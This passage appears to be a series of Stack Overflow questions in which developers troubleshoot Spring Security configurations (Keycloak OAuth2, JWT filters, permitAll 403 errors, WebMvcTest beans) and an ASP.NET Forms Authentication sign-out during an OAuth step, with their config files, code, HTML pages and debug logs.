spring.security.oauth2.client.registration.keycloak.client-id=payment-client
spring.security.oauth2.client.registration.keycloak.client-secret=apK0d8j5mmn32Do9Es
spring.security.oauth2.client.registration.keycloak.authorization-grant-type=authorization_code
spring.security.oauth2.client.registration.keycloak.scope=openid,read,write
spring.security.oauth2.client.registration.keycloak.redirect-uri=http://keycloak.payment/login/oauth2/code/keycloak

spring.security.oauth2.client.provider.keycloak.authorization-uri=http://keycloak.payment/realms/payment-realm/protocol/openid-connect/auth
spring.security.oauth2.client.provider.keycloak.token-uri=http://keycloak.payment/realms/payment-realm/protocol/openid-connect/token
spring.security.oauth2.client.provider.keycloak.user-info-uri=http://keycloak.payment/realms/payment-realm/protocol/openid-connect/userinfo
spring.security.oauth2.client.provider.keycloak.jwk-set-uri=http://keycloak.payment/realms/payment-realm/protocol/openid-connect/certs
spring.security.oauth2.client.provider.keycloak.user-name-attribute=preferred_username
spring.security.oauth2.client.provider.keycloak.user-info-authentication-method=header
</code></pre>
<p><strong>My currently Security class</strong></p>
<pre><code>@Configuration
@EnableWebSecurity
@RequiredArgsConstructor
public class SecurityConfig {
    private final AuthenticationEntryPoint tokenAuthenticationEntryPoint;
    private JwtAuthenticationManagerResolver authenticationManagerResolver;

    @Bean
    public SecurityFilterChain configure(HttpSecurity http) throws Exception {
        http.cors(AbstractHttpConfigurer::disable);
        http.oauth2ResourceServer(oauth2ResourceServer -&gt; oauth2ResourceServer.authenticationManagerResolver(authenticationManagerResolver).authenticationEntryPoint(tokenAuthenticationEntryPoint));
        http.authorizeHttpRequests((authorize) -&gt; authorize.requestMatchers(
                        &quot;/swagger-ui/**&quot;).permitAll().anyRequest().authenticated())
                .sessionManagement(manager -&gt; manager.sessionCreationPolicy(SessionCreationPolicy.STATELESS));
        return http.build();
    }
}
</code></pre>
<p><strong>My currently AuthenticationManagerResolve class</strong></p>
<pre><code>import jakarta.servlet.http.HttpServletRequest;
import lombok.RequiredArgsConstructor;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.AuthenticationManagerResolver;
import org.springframework.security.authentication.ProviderManager;
import org.springframework.security.oauth2.jwt.JwtDecoders;
import org.springframework.security.oauth2.server.resource.authentication.JwtAuthenticationProvider;
import org.springframework.stereotype.Component;

import java.util.Collections;

@Component
@RequiredArgsConstructor
public class JwtAuthenticationManagerResolver implements AuthenticationManagerResolver&lt;HttpServletRequest&gt; {

    @Override
    public AuthenticationManager resolve(HttpServletRequest request) {
        JwtAuthenticationProvider authenticationProvider = new JwtAuthenticationProvider(JwtDecoders.fromIssuerLocation(&quot;http://keycloak.payment/payment-realm&quot;));
        return new ProviderManager(Collections.singletonList(authenticationProvider));
    }
}
</code></pre>
<p>Even though I never specified the parameters I mentioned above, security is now verifying tokens properly. In what situation should I use these parameters? Currently I'm just using the &quot;spring-boot-starter-oauth2-resource-server&quot; dependency.</p>
<p>When is spring-boot-starter-oauth2-client dependency and above parameters needed.</p>
<p>Note: I use Keycloak only for token transactions. I use my own project for role and authority processing.</p>
"
"<p>I have a trouble. please help me.</p>
<p>My config</p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
@EnableWebSecurity
@RequiredArgsConstructor
public class SecurityConfig {

  private final CustomUserDetailsService userDetailsService;

  @Order(0)
  @Bean
  SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {

    http.authorizeHttpRequests(registry -&gt; registry
        .requestMatchers(&quot;/mypage&quot;).hasRole(&quot;USER&quot;)
        .requestMatchers(&quot;/messages&quot;).hasRole(&quot;MANAGER&quot;)
        .requestMatchers(&quot;/config&quot;).hasRole(&quot;ADMIN&quot;)
        .requestMatchers(&quot;/&quot;).permitAll()
        .anyRequest().authenticated());

    http.formLogin(Customizer.withDefaults());

    http.logout(config -&gt; config.logoutSuccessUrl(&quot;/&quot;));

    http.userDetailsService(userDetailsService);

    return http.build();
  }

  @Order(1)
  @Bean
  SecurityFilterChain resource(HttpSecurity http) throws Exception {

    http.authorizeHttpRequests(registry -&gt; registry
        .requestMatchers(PathRequest.toStaticResources().atCommonLocations()).permitAll()
        .anyRequest().authenticated());

    return http.build();
  }
</code></pre>
<p>login.html</p>
<pre class=""lang-html prettyprint-override""><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;ko&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;
      xmlns:sec=&quot;http://www.thymeleaf.org/extras/spring-security&quot;&gt;
&lt;div th:fragment=&quot;header&quot;&gt;
  &lt;nav class=&quot;navbar navbar-dark sticky-top bg-dark &quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
      &lt;a class=&quot;text-light&quot; href=&quot;#&quot;&gt;&lt;h4&gt;Core Spring Security&lt;/h4&gt;&lt;/a&gt;
      &lt;ul class=&quot;nav justify-content-end align-items-center&quot;&gt;
        &lt;li sec:authorize=&quot;!isAnonymous()&quot; class=&quot;nav-item&quot;&gt;
          &lt;div class=&quot;text-light&quot; th:text=&quot;${#authentication.name}&quot;&gt;
            The value of the &quot;name&quot; property of the authentication object should appear here.
          &lt;/div&gt;
        &lt;/li&gt;
        &lt;li sec:authorize=&quot;!isAuthenticated()&quot; class=&quot;nav-item&quot;&gt;
          &lt;a class=&quot;nav-link text-light&quot; th:href=&quot;@{/login}&quot;&gt;Login&lt;/a&gt;
        &lt;/li&gt;
        &lt;li class=&quot;nav-item&quot;&gt;
          &lt;a class=&quot;nav-link text-light&quot; href=&quot;/&quot;&gt;HOME&lt;/a&gt;
        &lt;/li&gt;
        &lt;li class=&quot;nav-item&quot;&gt;
          &lt;a class=&quot;nav-link text-light&quot; th:href=&quot;@{/users}&quot;&gt;Signup&lt;/a&gt;
        &lt;/li&gt;
        &lt;li sec:authorize=&quot;isAuthenticated()&quot; class=&quot;nav-item&quot;&gt;
          &lt;a class=&quot;nav-link text-light&quot; th:href=&quot;@{/logout}&quot;&gt;Logout&lt;/a&gt;
        &lt;/li&gt;
      &lt;/ul&gt;
    &lt;/div&gt;
  &lt;/nav&gt;
&lt;/div&gt;
&lt;/html&gt;

</code></pre>
<p><a href=""https://i.stack.imgur.com/4aFJq.png"" rel=""nofollow noreferrer"">This is an error page</a></p>
<p>I found that redirectUrl is css path but don't know why.</p>
<p><a href=""https://i.stack.imgur.com/w9b8f.png"" rel=""nofollow noreferrer"">This is a debugging screen</a>
(AbstractAuthenticationFilter-&gt; successHandler.onAuthenticaionSucess
and the successHandler instance is SavedRequestAwareAuthenticationSuccessHandler)</p>
<p>When combining the two settings, it works fine.
I heard that using <code>permitAll()</code> to static resource is alright
because the latest spring security doesn't access a <code>HttpSession</code>.</p>
<p>Is there a way that works well when using permitAll()
and separating the settings of static resources?</p>
<p>After logging in, I want to return to the page I was previously on. not css path.</p>
"
"<p>I have an ASP.NET Framework website running Forms Authentication where users sign in using their username/password credentials.
When the user attempts to access specific areas of the website I need them to verify their identity by using the Microsoft OAuth flow. This works by creating a request to:</p>
<p><code>login.microsoftonline.com/common/oauth2/authorize/common/oauth2/authorize?client_id=[clientID]&amp;response_type=id_token&amp;amr_values=ngcmfa&amp;response_mode=form_post&amp;scope=openid%20profile%20email&amp;redirect_uri=[returnUrl]&amp;nonce=[token]</code>.</p>
<p>This works fine - the user gets redirected to the Microsoft login page and can sign in using their company's policies for MFA etc.
However - when the user is redirected back to my site he gets signed out of Forms Authentication.
This is probably related to the auth cookie is not present in the request coming back from the external site verification - but why does the user get signed out of his existing context? I get that the post back to my URL is not authenticated as the user (unless I supply some value in the postback) - but why is the existing user signed out from my site? I just want the user to verify their identity via an external provider while still remaining logged into my site.</p>
"
"<p>I've an issue while running unit tests for REST controllers using <code>WebMvcTest</code> annotation.</p>
<p>It's important to mention that I don't want to bootstrap the whole context using the annotation <code>@SpringBootTest</code>. I want to make it work with <code>@WebMvcTest</code>.</p>
<p>Here is the test class:</p>
<pre><code>@Import(SecurityConfig.class)
@WebMvcTest(controllers = SomeController.class)
class SomeControllerTest {

    private static final String BASE_URL = &quot;/api/something&quot;;

    @Autowired
    private MockMvc mockMvc;

    @MockBean
    private SomeService someService;


    @Test
    void shouldReturnNoContent() throws Exception {
        doNothing().when(pauseJobUseCase).pause(anyString());
        mockMvc.perform(put(BASE_URL, anyString())).andExpect(status().isNoContent());
    }
}
</code></pre>
<p>and here is the Security Configuration:</p>
<pre><code>@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {

    @Value(&quot;${security.username}&quot;)
    private String username;

    @Value(&quot;${security.password}&quot;)
    private String password;


    @Bean
    @Order(1)
    public SecurityFilterChain adminSecurityFilterChain(HttpSecurity http) throws Exception {
        return http
           .securityMatcher(AntPathRequestMatcher.antMatcher(&quot;/api/app/**&quot;))
           .csrf(AbstractHttpConfigurer::disable)
           .cors(AbstractHttpConfigurer::disable)
           .sessionManagement(
                session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
           )
           .authorizeHttpRequests(auth -&gt; auth.anyRequest().authenticated())
           .httpBasic(withDefaults()) // Do not use in production environment!
           .build();
    }

    @Bean
    @Order(2)
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        return http
           .securityMatcher(&quot;/api/auth/**&quot;, &quot;/api/admin/**&quot;)
           .csrf(AbstractHttpConfigurer::disable)
           .cors(AbstractHttpConfigurer::disable)
           .headers(headers -&gt; headers.frameOptions(FrameOptionsConfig::disable))
           .sessionManagement(
               session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
           )
           .authorizeHttpRequests(
                 authorize -&gt; authorize
                 .requestMatchers(&quot;/api-docs/**&quot;, &quot;/scheduler-saas.html&quot;, &quot;/swagger-ui/**&quot;).permitAll()

                // will be handled on controller level (pre-authorized)
                .requestMatchers(&quot;/api/auth/**&quot;).permitAll()

                // &quot;Open&quot; API (requires correct credentials)
                .requestMatchers(&quot;/api/admin/**&quot;).permitAll()
                .anyRequest().authenticated()
          )
          .build();
     }

     @Bean
     @Order(3)
     public SecurityFilterChain jwtSecurityFilterChain(HttpSecurity http, JwtFilter jwtFilter)
      throws Exception {
      return http
         .securityMatcher(&quot;/api/job/**&quot;)
         .csrf(AbstractHttpConfigurer::disable)
         .cors(AbstractHttpConfigurer::disable)
         .headers(headers -&gt; headers.frameOptions(FrameOptionsConfig::disable))
         .sessionManagement(
             session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
         )
        .authorizeHttpRequests(auth -&gt; auth.anyRequest().authenticated())
        .addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class)
        .build();
  }

  @Bean
  public PasswordEncoder passwordEncoder() {
      return new BCryptPasswordEncoder();
  }

  @Bean
  public InMemoryUserDetailsManager userDetailsService(PasswordEncoder passwordEncoder) 
  {
      var userDetails = User.builder()
          .username(username)
          .password(passwordEncoder.encode(password))
          .roles(&quot;ADMIN&quot;)
          .build();

      return new InMemoryUserDetailsManager(userDetails);
  }

  public record AccessViolationResponse(String message, String localizedMessage) {
  }
}
</code></pre>
<p>The error I'm getting is the following:</p>
<blockquote>
<p>No qualifying bean of type
'com.hedza06.saasscheduler.security.jwt.JwtTokenProvider' available:
expected at least 1 bean which qualifies as autowire candidate.
Dependency annotations: {}</p>
</blockquote>
<p>I've read this <a href=""https://github.com/spring-projects/spring-boot/issues/31162"" rel=""nofollow noreferrer"">GitHub issue</a> but it wasn't helpful.</p>
<p>The tech stack I'm using is the following:</p>
<ul>
<li>Java 21</li>
<li>Spring Boot 3.1.4</li>
<li>Spring Security Core [6.1.4]</li>
</ul>
<p>Any ideas how to solve this issue?</p>
"
"<p>I've recently been learning how to implement a login page using JWT tokens. However, I've encountered a problem during my practice.</p>
<p>Allow me to present the code first, please.</p>
<blockquote>
<ol>
<li>WebSecurityConfig</li>
</ol>
</blockquote>
<pre><code>@Configuration
@EnableWebSecurity 
@RequiredArgsConstructor
public class WebSecurityConfig {

private final JwtUtil jwtUtil;
private final RedisService redisService;
private final UserDetailsServiceImpl userDetailsService;
private final AuthenticationConfiguration authenticationConfiguration;

@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
}

@Bean
public AuthenticationManager authenticationManager(AuthenticationConfiguration configuration) throws Exception {
    return configuration.getAuthenticationManager();
}

@Bean
public AuthenticationFilter jwtAuthenticationFilter() throws Exception {
    AuthenticationFilter filter = new AuthenticationFilter(jwtUtil, redisService);
    filter.setAuthenticationManager(authenticationManager(authenticationConfiguration));
    return filter;
}

@Bean
public AuthorizationFilter jwtAuthorizationFilter() {
    return new AuthorizationFilter(jwtUtil, userDetailsService);
}

@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    // CSRF setting
    http.csrf((csrf) -&gt; csrf.disable());

    http.sessionManagement((sessionManagement) -&gt;
            sessionManagement.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
    );

    http.authorizeHttpRequests((authorizeHttpRequests) -&gt;
            authorizeHttpRequests
                    .requestMatchers(PathRequest.toStaticResources().atCommonLocations()).permitAll() // Allow access to resources
                    .requestMatchers(&quot;/&quot;).permitAll() // Allow requests to the main page
                    .requestMatchers(&quot;/user/**&quot;).permitAll() // Allow all requests starting with '/user/'
                    .requestMatchers(&quot;/user/refresh-token&quot;).permitAll()
                    .anyRequest().authenticated() // Authenticate all other requests
    );

    http.formLogin((formLogin) -&gt;
            formLogin
                    .loginPage(&quot;/user/login-page&quot;).permitAll()
    );

    // Filter management
    http.addFilterBefore(jwtAuthorizationFilter(), AuthenticationFilter.class);
    http.addFilterBefore(jwtAuthenticationFilter(), UsernamePasswordAuthenticationFilter.class);

    return http.build();
    }
}
</code></pre>
<blockquote>
<ol start=""2"">
<li>AuthorizationFilter</li>
</ol>
</blockquote>
<pre><code>@Slf4j(topic = &quot;JWT Verification and Authorization&quot;)
public class AuthorizationFilter extends OncePerRequestFilter {

    private final JwtUtil jwtUtil;
    private final UserDetailsServiceImpl userDetailsService;

    public AuthorizationFilter(JwtUtil jwtUtil, UserDetailsServiceImpl userDetailsService) {
        this.jwtUtil = jwtUtil;
        this.userDetailsService = userDetailsService;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res, FilterChain filterChain) throws ServletException, IOException {

        // Extract token from header
        String tokenValue = jwtUtil.getJwtFromHeader(req);

        if (StringUtils.hasText(tokenValue)) {

            // Validate token
            if (!jwtUtil.validateToken(tokenValue)) {
                log.error(&quot;Token Error&quot;);

                return;
            }
            Claims info = jwtUtil.getUserInfoFromToken(tokenValue);

            try {
                setAuthentication(info.getSubject());
            } catch (Exception e) {
                log.error(e.getMessage());
                return;
            }
        }

        filterChain.doFilter(req, res);
    }

    // Process authentication
    public void setAuthentication(String loginId) {
        SecurityContext context = SecurityContextHolder.createEmptyContext();
        Authentication authentication = createAuthentication(loginId);
        context.setAuthentication(authentication);

        SecurityContextHolder.setContext(context);
    }

    // Create authentication object
    private Authentication createAuthentication(String loginId) {
        UserDetails userDetails = userDetailsService.loadUserByUsername(loginId);
        return new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
    }
}
</code></pre>
<blockquote>
<ol start=""3"">
<li>AuthenticationFilter</li>
</ol>
</blockquote>
<pre><code>@Slf4j(topic = &quot;Login and JWT Generation&quot;)
public class AuthenticationFilter extends UsernamePasswordAuthenticationFilter {
    private final JwtUtil jwtUtil;
    private final RedisService redisService;

    public AuthenticationFilter(JwtUtil jwtUtil, RedisService redisService) {
        this.redisService = redisService;
        this.jwtUtil = jwtUtil;
        setFilterProcessesUrl(&quot;/user/login&quot;);
    }

    @Override
    public Authentication attemptAuthentication(HttpServletRequest request, HttpServletResponse response) throws AuthenticationException {
        log.info(&quot;Attempting login&quot;);
        try {
            LoginRequestDto requestDto = new ObjectMapper().readValue(request.getInputStream(), LoginRequestDto.class);

            return getAuthenticationManager().authenticate(
                    new UsernamePasswordAuthenticationToken(
                            requestDto.getLoginId(),
                            requestDto.getPassword(),
                            new ArrayList&lt;&gt;()
                    )
            );
        } catch (IOException e) {
            log.error(e.getMessage());
            throw new RuntimeException(e.getMessage());
        }
    }

    @Override
    protected void successfulAuthentication(HttpServletRequest request, HttpServletResponse response, FilterChain chain, Authentication authResult) throws IOException {
        log.info(&quot;Login successful and JWT generated&quot;);
        response.setContentType(&quot;application/json&quot;);
        response.setCharacterEncoding(&quot;UTF-8&quot;);
        response.getWriter().write(new ObjectMapper().writeValueAsString(new ApiResponseDto(&quot;Login successful&quot;, HttpStatus.OK.value())));

        String loginId = ((UserDetailsImpl) authResult.getPrincipal()).getUsername();
        UserRoleEnum role = ((UserDetailsImpl) authResult.getPrincipal()).getUser().getRole();

        String accessToken = jwtUtil.createAccessToken(loginId, role);
        String refreshToken = jwtUtil.createRefreshToken(loginId);

        redisService.saveRefreshToken(loginId, refreshToken);

        // Store Access Token in header
        response.addHeader(JwtUtil.AUTHORIZATION_HEADER, &quot;Bearer &quot; + accessToken);

        // Store Refresh Token in cookie
        Cookie refreshCookie = new Cookie(&quot;refreshToken&quot;, refreshToken);
        refreshCookie.setHttpOnly(true); // Prevent access through JavaScript
        refreshCookie.setSecure(true); // Only transmit cookies over HTTPS
        refreshCookie.setPath(&quot;/&quot;); // Use cookie across the site
        response.addCookie(refreshCookie);
    }

    @Override
    protected void unsuccessfulAuthentication(HttpServletRequest request, HttpServletResponse response, AuthenticationException failed) {
        response.setStatus(401);
    }
}
</code></pre>
<blockquote>
<ol start=""4"">
<li>Login.html</li>
</ol>
</blockquote>
<pre><code>    &lt;!DOCTYPE html&gt;
    &lt;html lang=&quot;en&quot;&gt;
    &lt;head&gt;
        &lt;meta charset=&quot;UTF-8&quot;&gt;
        &lt;title&gt;Login Page&lt;/title&gt;
        &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;
    &lt;/head&gt;
    &lt;body&gt;
    &lt;h1&gt;Login&lt;/h1&gt;
    &lt;form id=&quot;loginForm&quot;&gt;
        &lt;label for=&quot;loginId&quot;&gt;Username:&lt;/label&gt;
        &lt;input type=&quot;text&quot; id=&quot;loginId&quot; name=&quot;loginId&quot; required&gt;
        &lt;br&gt;
        &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;
        &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
        &lt;br&gt;
        &lt;button type=&quot;button&quot; id=&quot;loginButton&quot;&gt;Login&lt;/button&gt;
    &lt;/form&gt;
    
    &lt;script&gt;
        $(document).ready(function() {
            $('#loginButton').click(function() {
                $.ajax({
                    url: '/user/login', // Check server's login processing URL
                    type: 'POST',
                    contentType: 'application/json',
                    data: JSON.stringify({
                        loginId: $('#loginId').val(),
                        password: $('#password').val()
                    }),
                    success: function(data, textStatus, xhr) {
                        // Extract Access Token from the response header and store it in local storage
                        const accessToken = xhr.getResponseHeader('Authorization');
                        if (accessToken) {
                            localStorage.setItem('accessToken', accessToken); // Store Access Token
                            window.location.href = '/test'; // Redirect to the test page
                        } else {
                            alert('Failed to receive Access Token.');
                        }
                    },
                    error: function(xhr, textStatus, errorThrown) {
                        alert('Login failed: ' + textStatus);
                    }
                });
            });
        });
    &lt;/script&gt;
    &lt;/body&gt;
    &lt;/html&gt;
</code></pre>
<blockquote>
<ol start=""5"">
<li>test.html</li>
</ol>
</blockquote>
<pre><code>&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;Test Page&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;This is a test page.&lt;/h1&gt;
&lt;/body&gt;
</code></pre>
<blockquote>
<ol start=""6"">
<li>TestController</li>
</ol>
</blockquote>
<pre><code>@Controller
public class TestController {
    @GetMapping(&quot;/test&quot;)
    public String testPage() {
        return &quot;test&quot;;
    }
}
</code></pre>
<p>I've configured my WebSecurityConfig to restrict access to pages only for authenticated users. Here's what I'm trying to test:</p>
<ol>
<li>Only authenticated users are allowed to access the &quot;test&quot; page through the &quot;AuthorizationFilter&quot;.</li>
<li>Successfully logged-in users are automatically redirected to the &quot;test&quot; page.</li>
<li>Upon accessing the &quot;test&quot; page, successfully logged-in users undergo authorization via the &quot;AuthorizationFilter&quot;.</li>
</ol>
<p>However, none of the three scenarios are working as intended:</p>
<p>For the first scenario, requests don't seem to go through the &quot;AuthorizationFilter&quot; at all.
For the second and third scenarios, the process only goes as far as hitting the &quot;AuthenticationFilter&quot; and printing the log &quot;Login successful and JWT generated&quot;.
What could be the issue here?</p>
<p>Could it be because the &quot;Access Token&quot; is stored in local storage and not extracted from the header when requesting the &quot;test&quot; page afterwards?</p>
"
"<p>I am trying to set up a new project using Spring security. The purpose of the projetc is to create few web apis to be used in a react interface. At present, I am using Spring boot 3.2.2 and Spring security 6.2.1</p>
<p>I have most of the things set up. However, for some reasons, the framework always throws 403 on my permitAll() endpoints.</p>
<p>Below is my security chain object:</p>
<pre><code> @Bean
public SecurityFilterChain securityFilterChain(HttpSecurity httpSecurity) throws Exception {
    System.out.println(httpSecurity);
      return httpSecurity
                .authorizeHttpRequests((auth) -&gt; auth
                        .requestMatchers(&quot;/api/myproject/admin/**&quot;) // I have tried removing this condition also
                        .hasRole(&quot;ADMIN&quot;)
                        .requestMatchers(HttpMethod.POST, &quot;/public/login&quot;) // I have tried without context path also
                        .permitAll()
                        .requestMatchers(HttpMethod.POST, &quot;/api/myproject/public/login&quot;) // tried with context path also
                        .permitAll()
                        .anyRequest().authenticated()
                    )
                .csrf(AbstractHttpConfigurer::disable) // tried disabling csrf as well
                .authenticationProvider(authenticationProvider())
                .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class)
                .build();

}
</code></pre>
<p>I have gone through many similar questions and articles and have tried lot of thing including:</p>
<ol>
<li>Using both GET and POST for my login endpoint (Ideally I wanted a POST).</li>
<li>Tried disabling csrf</li>
<li>Tried putting the endpoint path with and without context path (/api/myproject is my context path)</li>
<li>Tried specifying HTTP POST verb as shown above</li>
<li>Also tried the above config with everything removed and just 1 rule for login route</li>
</ol>
<p>None of these have worked for me so far. However If a permitAll everything like:</p>
<pre><code>return httpSecurity
            .authorizeHttpRequests((auth) -&gt; auth
            .anyRequest().permitAll()
</code></pre>
<p>then it works for me and makes all the endpoints public including the login endpoint.</p>
<p>I am not sure what I am doing wrong for whitelisting only the login endpoint as public. Can some one please help.</p>
<p>Edit: Adding the controller code below:</p>
<pre><code>@Slf4j
@RestController
@RequestMapping(&quot;/public&quot;)
public class LoginController {

    @Autowired
    private LoginService loginService;

    @PostMapping(&quot;/login&quot;)
    public ResponseEntity&lt;LoginResponse&gt; generateUserToken(@RequestBody LoginRequest loginRequest) {
        log.info(&quot;generateUserToken Started&quot;);
        String token = loginService.login(loginRequest.getEmailId(), loginRequest.getPwd());
        return ResponseEntity.ok(new LoginResponse(token));
    }

}
</code></pre>
<p>The postman cUrl for the API call is:</p>
<pre><code>curl --location 'http://localhost:8080/api/myproject/public/login' \
--header 'Content-Type: application/json' \
--header 'Cookie: JSESSIONID=9E2DD3E4A04619324786B0F595BD96FD' \
--data-raw '{
    &quot;emailId&quot;: &quot;dkjkaj@gmail.com&quot;,
    &quot;pwd&quot;: &quot;jhdsjhdj&quot;
}'
</code></pre>
<p>Thanks</p>
"
"<p>I'm new to SpringBoot, and trying to implement Spring Security with JWT. I have problem and I think it has something to do with JWT filter and security config.</p>
<p>I tried debugging Spring Security by setting <code>@EnableWebSecurity(debug = true)</code> in my <code>SecurityConfig.java</code>, and I found something wrong. When I send a POST request that does signup user, somehow the servlet path changes in the middle of the request.</p>
<pre><code>Request received for POST '/auth/signup':

org.apache.catalina.connector.RequestFacade@63af20a

servletPath:/auth/signup
pathInfo:null
headers: 
user-agent: PostmanRuntime/7.36.1
accept: */*
postman-token: 25e5cac3-a91f-40a4-8a3e-20a541aff803
host: localhost:8080
accept-encoding: gzip, deflate, br
connection: keep-alive
content-type: multipart/form-data; boundary=--------------------------054882976756079921653325
cookie: JSESSIONID=E2A8E65C25C184D47724FBA022FBAA94
content-length: 149066


Security filter chain: [
  DisableEncodeUrlFilter
  WebAsyncManagerIntegrationFilter
  SecurityContextHolderFilter
  HeaderWriterFilter
  LogoutFilter
  JwtAuthorizationFilter
  RequestCacheAwareFilter
  SecurityContextHolderAwareRequestFilter
  AnonymousAuthenticationFilter
  SessionManagementFilter
  ExceptionTranslationFilter
  AuthorizationFilter
]


************************************************************


2024-02-25T20:46:06.469+09:00  INFO 92709 --- [nio-8080-exec-2] c.c.c.login.jwt.JwtAuthorizationFilter   : ===doFilterInternal Started===
2024-02-25T20:46:06.469+09:00  INFO 92709 --- [nio-8080-exec-2] c.c.c.login.jwt.JwtAuthorizationFilter   : ===request path: /auth/signup===
2024-02-25T20:46:06.470+09:00  INFO 92709 --- [nio-8080-exec-2] c.c.c.login.jwt.JwtAuthorizationFilter   : contains 'auth'
2024-02-25T20:46:06.644+09:00 DEBUG 92709 --- [nio-8080-exec-2] org.hibernate.SQL                        : 
    select
        u1_0.user_id,
        u1_0.created_date,
        u1_0.email,
        u1_0.modified_date,
        u1_0.nickname,
        u1_0.profile_image,
        u1_0.refresh_token,
        u1_0.role,
        u1_0.self_description,
        u1_0.social_id,
        u1_0.social_login_type,
        u1_0.social_refresh_token 
    from
        user u1_0 
    where
        u1_0.social_id=?
Hibernate: 
    select
        u1_0.user_id,
        u1_0.created_date,
        u1_0.email,
        u1_0.modified_date,
        u1_0.nickname,
        u1_0.profile_image,
        u1_0.refresh_token,
        u1_0.role,
        u1_0.self_description,
        u1_0.social_id,
        u1_0.social_login_type,
        u1_0.social_refresh_token 
    from
        user u1_0 
    where
        u1_0.social_id=?
2024-02-25T20:46:06.664+09:00 DEBUG 92709 --- [nio-8080-exec-2] c.c.cookieeserver.login.OAuthService     : OAuthService, signup - 이미 존재하는 사용자
2024-02-25T20:46:06.693+09:00 DEBUG 92709 --- [nio-8080-exec-2] c.c.cookieeserver.login.OAuthController  : 이미 존재하는 사용자입니다.
2024-02-25T20:46:06.703+09:00  INFO 92709 --- [nio-8080-exec-2] Spring Security Debugger                 : 

************************************************************

Request received for POST '/auth/auth/signup':

org.springframework.web.multipart.support.StandardMultipartHttpServletRequest@657cc2d2

servletPath:/auth/auth/signup
pathInfo:null
headers: 
user-agent: PostmanRuntime/7.36.1
accept: */*
postman-token: 25e5cac3-a91f-40a4-8a3e-20a541aff803
host: localhost:8080
accept-encoding: gzip, deflate, br
connection: keep-alive
content-type: multipart/form-data; boundary=--------------------------054882976756079921653325
cookie: JSESSIONID=E2A8E65C25C184D47724FBA022FBAA94
content-length: 149066


Security filter chain: [
  DisableEncodeUrlFilter
  WebAsyncManagerIntegrationFilter
  SecurityContextHolderFilter
  HeaderWriterFilter
  LogoutFilter
  JwtAuthorizationFilter
  RequestCacheAwareFilter
  SecurityContextHolderAwareRequestFilter
  AnonymousAuthenticationFilter
  SessionManagementFilter
  ExceptionTranslationFilter
  AuthorizationFilter
]


************************************************************


2024-02-25T20:46:06.709+09:00  INFO 92709 --- [nio-8080-exec-2] Spring Security Debugger                 : 

************************************************************

Request received for POST '/error':

org.apache.catalina.core.ApplicationHttpRequest@746c5161

servletPath:/error
pathInfo:null
headers: 
user-agent: PostmanRuntime/7.36.1
accept: */*
postman-token: 25e5cac3-a91f-40a4-8a3e-20a541aff803
host: localhost:8080
accept-encoding: gzip, deflate, br
connection: keep-alive
content-type: multipart/form-data; boundary=--------------------------054882976756079921653325
cookie: JSESSIONID=E2A8E65C25C184D47724FBA022FBAA94
content-length: 149066


Security filter chain: [
  DisableEncodeUrlFilter
  WebAsyncManagerIntegrationFilter
  SecurityContextHolderFilter
  HeaderWriterFilter
  LogoutFilter
  JwtAuthorizationFilter
  RequestCacheAwareFilter
  SecurityContextHolderAwareRequestFilter
  AnonymousAuthenticationFilter
  SessionManagementFilter
  ExceptionTranslationFilter
  AuthorizationFilter
]


************************************************************
</code></pre>
<p>You can see that the url changes from <code>/auth/signup</code> to <code>/auth/auth/signup</code>. I have no idea how this has happened, but I'm guess if it has to do with Multipart..? And the result that I get from this is</p>
<pre class=""lang-json prettyprint-override""><code>{
    &quot;timestamp&quot;: &quot;2024-02-25T11:46:06.710+00:00&quot;,
    &quot;status&quot;: 404,
    &quot;error&quot;: &quot;Not Found&quot;,
    &quot;path&quot;: &quot;/auth/signup&quot;
}
</code></pre>
<p>Just in case, I'll put up some codes that I think are related to this problem.</p>
<p><code>SecurityConfig.java</code></p>
<pre class=""lang-java prettyprint-override""><code>package com.cookiee.cookieeserver.login.config;

import com.cookiee.cookieeserver.login.jwt.JwtAuthorizationFilter;
import com.cookiee.cookieeserver.login.jwt.JwtService;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpMethod;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.web.AuthenticationEntryPoint;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;

@RequiredArgsConstructor
@EnableWebSecurity(debug = true)
@Configuration
@Slf4j
public class SecurityConfig {
    private final JwtService jwtService;
    private final AuthenticationEntryPoint entryPoint;  // 빈으로 등록된 엔트리 포인트 주입받음. 즉, JwtAuthenticationEntryPoint 주입

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        log.info(&quot;=== SecurityFilterChain Started ===&quot;);
        http.csrf(AbstractHttpConfigurer::disable)  // 서버에 인증정보를 저장하지 않기 때문에 csrf 보안을 사용X
